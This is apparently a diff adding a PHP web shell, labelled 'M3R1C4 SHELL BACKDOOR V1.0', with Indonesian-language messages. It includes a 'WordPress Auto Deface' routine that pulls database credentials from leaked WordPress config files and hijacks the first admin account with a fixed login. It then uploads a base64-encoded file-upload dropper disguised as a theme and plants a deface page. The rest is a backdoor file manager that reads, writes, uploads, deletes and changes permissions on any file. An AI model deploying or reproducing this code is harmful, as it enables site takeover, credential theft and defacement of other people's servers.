+          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+          curl_setopt($ch, CURLOPT_POST, 1);
+          curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+          curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
+          curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
+          curl_setopt($ch, CURLOPT_COOKIESESSION, true);
+      $data = curl_exec($ch);
+          curl_close($ch);
+      return $data;
+    }
+    $link = explode("\r\n", $_POST['link']);
+    $script = htmlspecialchars($_POST['script']);
+    $user = "indoxploit";
+    $pass = "indoxploit";
+    $passx = md5($pass);
+    foreach($link as $dir_config) {
+      $config = anucurl($dir_config);
+      $dbhost = ambilkata($config,"DB_HOST', '","'");
+      $dbuser = ambilkata($config,"DB_USER', '","'");
+      $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
+      $dbname = ambilkata($config,"DB_NAME', '","'");
+      $dbprefix = ambilkata($config,"table_prefix  = '","'");
+      $prefix = $dbprefix."users";
+      $option = $dbprefix."options";
+      $conn = mysql_connect($dbhost,$dbuser,$dbpass);
+      $db = mysql_select_db($dbname);
+      $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
+      $result = mysql_fetch_array($q);
+      $id = $result[ID];
+      $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
+      $result2 = mysql_fetch_array($q2);
+      $target = $result2[option_value];
+      if($target == '') {         
+        echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
+      } else {
+        echo "[+] $target <br>";
+      }
+      $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
+      if(!$conn OR !$db OR !$update) {
+        echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
+        mysql_close($conn);
+      } else {
+        $site = "$target/wp-login.php";
+        $site2 = "$target/wp-admin/theme-install.php?upload";
+        $b1 = anucurl($site2);
+        $wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
+        $b = lohgin($site, $site2, $user, $pass, $wp_sub);
+        $anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
+        $upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
+        $www = "m.php";
+        $fp5 = fopen($www,"w");
+        fputs($fp5,$upload3);
+        $post2 = array(
+            "_wpnonce" => "$anu2",
+            "_wp_http_referer" => "/wp-admin/theme-install.php?upload",
+            "themezip" => "@$www",
+            "install-theme-submit" => "Install Now",
+            );
+        $ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
+            curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
+            curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
+              curl_setopt($ch, CURLOPT_COOKIESESSION, true);
+        $data3 = curl_exec($ch);
+            curl_close($ch);
+        $y = date("Y");
+        $m = date("m");
+        $namafile = "id.php";
+        $fpi = fopen($namafile,"w");
+        fputs($fpi,$script);
+        $ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
+             curl_setopt($ch6, CURLOPT_POST, true);
+             curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
+             curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
+             curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
+                   curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
+                 curl_setopt($ch6, CURLOPT_COOKIESESSION,true);
+        $postResult = curl_exec($ch6);
+             curl_close($ch6);
+        $as = "$target/k.php";
+        $bs = anucurl($as);
+        if(preg_match("#$script#is", $bs)) {
+                    echo "[+] <font color='lime'>Berhasil...</font><br>";
+                    echo "[+] <a href='$as' target='_blank'>$as</a><br><br>"; 
+                    } else {
+                    echo "[-] <font color='red'>Gagal...</font><br>";
+                    echo "[!!] coba aja manual: <br>";
+                    echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
+                    echo "[+] username: <font color=lime>$user</font><br>";
+                    echo "[+] password: <font color=lime>$pass</font><br><br>";     
+                    }
+              mysql_close($conn);
+      }
+    }
+  } else {
+    echo "<center><h1>WordPress Auto Deface V.2</h1>
+    <form method='post'>
+    Link Config: <br>
+    <textarea name='link' placeholder='http://target.com/idx_config/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
+    <input type='text' name='script' height='10' size='50' placeholder='Hacked by ' required><br>
+    <input type='submit' style='width: 100px;' name='auto_deface_wp' value='Hajar!!'>
+    </form></center>";
+  }
+}
+echo '</font></center></td></tr><tr><td><center>';
+if(isset($_FILES['file'])){
+if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
+echo '<font color="green">File Upload</font><br />';
+}else{
+echo '<font color="red">Upload Failed !!</font><br />';
+}
+}
+echo '</center><center><form enctype="multipart/form-data" method="POST"><font color="black"><input style="background:silver;font-family: Comic Sans MS " type="file" name="file" />
+<input type="submit" value="Upload" />
+</form></center>
+</td></tr>';
+if(isset($_GET['filesrc'])){
+echo "<tr><td><center>Current File : ";
+echo $_GET['filesrc'];
+echo '</center></tr></td></table><br />';
+echo(' <textarea style="width: 100%;height: 400px;" readonly> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');
+}
+//Empety
+elseif(isset($_GET['option']) && $_GET['opt'] != 'delete'){
+echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
+//Chmod
+if($_GET['opt'] == 'chmod'){
+if(isset($_POST['perm'])){
+if(chmod($_POST['path'],$_POST['perm'])){
+echo '<font color="green">Change Permission Done </font><br />';
+}else{
+echo '<font color="red">Change Permission Error </font><br />';
+}
+}
+
+$hell = $_GET['path'];
+$yeah = $_GET['name'];
+$patc = "$hell/$yeah";
+
+echo '<form method="POST">
+Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($patc)), -4).'" />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="chmod">
+<input type="submit" value="Submit" />
+</form>';
+}
+//
+elseif($_GET['opt'] == 'btw'){
+  $cwd = getcwd();
+   echo '<form action="?option&path='.$cwd.'&opt=delete&type=buat" method="POST">
+New Name : <input name="name" type="text" size="20" value="Folder" />
+<input type="hidden" name="path" value="'.$cwd.'">
+<input type="hidden" name="opt" value="delete">
+<input type="submit" value="Submit" />
+</form>';
+}
+//Rename file
+elseif($_GET['opt'] == 'rename'){
+if(isset($_POST['newname'])){
+if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
+echo '<font color="green">Change Name Done </font><br />';
+}else{
+echo '<font color="red">Change Name Error </font><br />';
+}
+$_POST['name'] = $_POST['newname'];
+}
+$hell = $_GET['path'];
+$yeah = $_GET['name'];
+$patc = "$hell/$yeah";
+$new = $_POST['newname'];
+
+echo '<form method="POST">
+New Name : <input name="newname" type="text" size="20" value="'.$new.'" />
+<input type="hidden" name="path" value="'.$patc.'">
+<input type="hidden" name="opt" value="rename">
+<input type="submit" value="Submit" />
+</form>';
+}
+//File baru
+elseif($_GET['opt'] == 'baru'){
+  
+$hell = $_GET['path'];
+$yeah = $_GET['name'];
+$patc = "$hell/$yeah";
+$new = $_POST['newname'];
+$azz = $_POST['path'];
+$newz = "$azz/$new";
+
+
+if(isset($_POST['src'])){
+$fp = fopen($_POST['path'],'w');
+if(fwrite($fp,$_POST['src'])){
+echo '<font color="green">Create File Done [ '.$new.' ]</font><br />';
+}else{
+echo '<font color="red">Create File Error</font><br />';
+}
+fclose($fp);
+}
+
+echo '<form method="POST"> Name : <input name="ngaran1" type="text" size="20" value="'.$new.'" /><input type="submit" name="ngaran" value="Create"/></form><br> ';
+
+$ho = $_POST['ngaran1'];
+
+if(isset($_POST['ngaran'])){
+echo '<form method="POST">
+<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($patc)).'</textarea><br />
+<input type="hidden" name="path" value="'.$hell.'/'.$ho.'">
+<input type="hidden" name="opt" value="edit">
+<input type="submit" value="Submit" />
+</form>';
+  }
+  }
+//Edited file
+elseif($_GET['opt'] == 'edit'){
+if(isset($_POST['src'])){
+$fp = fopen($_POST['path'],'w');
+if(fwrite($fp,$_POST['src'])){
+echo '<font color="green">Edit File Done </font><br />';
+}else{
+echo '<font color="red">Edit File Error </font><br />';
+}
+fclose($fp);
+}
+$hell = $_GET['path'];
+$yeah = $_GET['name'];
+$patc = "$hell/$yeah";
+echo '<form method="POST">
+<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($patc)).'</textarea><br />
+<input type="hidden" name="path" value="'.$patc.'">
+<input type="hidden" name="opt" value="edit">
+<input type="submit" value="Submit" />
+</form>';
+}
+echo '</center>';
+}else{
+echo '</table><br /><center>';
+//Delete dir and file
+if(isset($_GET['option']) && $_GET['opt'] == 'delete'){
+  
+$hell = $_GET['path'];
+$yeah = $_GET['name'];
+$patc = "$hell/$yeah";
+
+//Delete dir
+if($_GET['type'] == 'dir'){
+
+if(rmdir($patc)){
+echo '<font color="green">Delete File Done</font><br />';
+}else{
+echo '<font color="red#">Delete File Error </font><br />';
+}
+}
+//buat folder
+if($_GET['type'] == 'buat'){
+$haaa = $_POST['path'];
+$heee = $_POST['name'];
+$hooo = "$haaa/$heee";
+$new = $haaa.'/'.htmlspecialchars($heee);
+if(!mkdir($new)){
+echo '<font color="red">Create Folder Error</font><br />';
+}else{
+echo '<font color="green">Create Folder Done </font><br />';
+}
+}
+//Delete file
+elseif($_GET['type'] == 'file'){
+
+$hell = $_GET['path'];
+$yeah = $_GET['name'];
+$patc = "$hell/$yeah";
+
+if(unlink($patc)){
+echo '<font color="green">Delete File Done</font><br />';
+}else{
+echo '<font color="red#">Delete File Error </font><br />';
+}
+}
+}
+echo '</center>';
+$scandir = scandir($path);
+$pa = getcwd();
+echo ' <table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr>
+<th class=th_home style="background:silver;color:black;"><center>Name</center></th>
+<th class=th_home style="background:silver;color:black;" ><center>Size</center></th>
+<th class=th_home style="background:silver;color:black;" ><center>Permission</center></th>
+<th class=th_home style="background:silver;color:black;" ><center>Options</center></th>
+</tr> <tr>
+<td class=td_home>..</td><td class=td_home align=center>NONE</td> <td class=td_home align=center>LINK</td> <td class=td_home align=center> <a href="?option&path='.$pa.'&opt=baru&name=new.php">New File</a> | <a href="?option&path='.$pa.'&opt=btw&type=dir">New Folder</a> </td></tr>
+';
+
+foreach($scandir as $dir){
+if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
+echo "
+<tr>
+<td class=td_home> <img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='> <a href=\"?path=$path/$dir\">$dir</a></td>
+<td class=td_home ><center>DIR</center></td>
+<td class=td_home ><center>";
+if(is_writable("$path/$dir")) echo '<font color="green">';
+elseif(!is_readable("$path/$dir")) echo '<font color="red">';
+echo perms("$path/$dir");
+if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
+
+echo "</center></td>
+<td class=td_home ><center>
+<a href=\"?option&path=$path&opt=rename&type=dir&name=$dir\">Rename</a> <a href=\"?option&path=$path&opt=delete&type=dir&name=$dir\">Delete</a> <a href=\"?option&path=$path&opt=chmod&type=dir&name=$dir\">Chmod</a>
+
+</center></td>
+</tr>";
+}
+echo '<br>';
+foreach($scandir as $file){
+if(!is_file("$path/$file")) continue;
+$size = filesize("$path/$file")/1024;
+$size = round($size,3);
+if($size >= 1024){
+$size = round($size/1024,2).' MB';
+}else{
+$size = $size.' KB';
+}
+
+echo "<tr>
+<td class=td_home > <img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='> <a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
+<td class=td_home><center>".$size."</center></td>
+<td class=td_home><center>";
+if(is_writable("$path/$file")) echo '<font color="green">';
+elseif(!is_readable("$path/$file")) echo '<font color="red">';
+echo perms("$path/$file");
+if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
+echo "</center></td>
+<td class=td_home><center>
+<a href=\"?option&path=$path&opt=edit&type=file&name=$file\">Edit</a> <a href=\"?option&path=$path&opt=rename&type=file&name=$file&path=$path\">Rename</a> <a href=\"?option&path=$path&opt=delete&type=file&name=$file\">Delete</a> <a href=\"?option&path=$path&opt=chmod&type=file&name=$file\">Chmod</a>
+</center></td>
+</tr>";
+}
+echo '</table>
+</div>';
+}
+echo '<br><center>Copyright &copy; Trenggalek Cyber Army</b></body>
+</html>';
+function perms($file){
+$perms = fileperms($file);
+
+if (($perms & 0xC000) == 0xC000) {
+// Socket
+$info = 's';
+} elseif (($perms & 0xA000) == 0xA000) {
+// Symbolic Link
+$info = 'l';
+} elseif (($perms & 0x8000) == 0x8000) {
+// Regular
+$info = '-';
+} elseif (($perms & 0x6000) == 0x6000) {
+// Block special
+$info = 'b';
+} elseif (($perms & 0x4000) == 0x4000) {
+// Directory
+$info = 'd';
+} elseif (($perms & 0x2000) == 0x2000) {
+// Character special
+$info = 'c';
+} elseif (($perms & 0x1000) == 0x1000) {
+// FIFO pipe
+$info = 'p';
+} else {
+// Unknown
+$info = 'u';
+}
+
+// Owner
+$info .= (($perms & 0x0100) ? 'r' : '-');
+$info .= (($perms & 0x0080) ? 'w' : '-');
+$info .= (($perms & 0x0040) ?
+(($perms & 0x0800) ? 's' : 'x' ) :
+(($perms & 0x0800) ? 'S' : '-'));
+
+// Group
+$info .= (($perms & 0x0020) ? 'r' : '-');
+$info .= (($perms & 0x0010) ? 'w' : '-');
+$info .= (($perms & 0x0008) ?
+(($perms & 0x0400) ? 's' : 'x' ) :
+(($perms & 0x0400) ? 'S' : '-'));
+
+// World
+$info .= (($perms & 0x0004) ? 'r' : '-');
+$info .= (($perms & 0x0002) ? 'w' : '-');
+$info .= (($perms & 0x0001) ?
+(($perms & 0x0200) ? 't' : 'x' ) :
+(($perms & 0x0200) ? 'T' : '-'));
+
+return $info;
+}
+//M3R1C4 SHELL BACKDOOR V1.0 
+//Design By Noval - TCA team
+//Greezt : IndoXploit & Ustadcage48
+//Keep Calm & Crootz!</html>
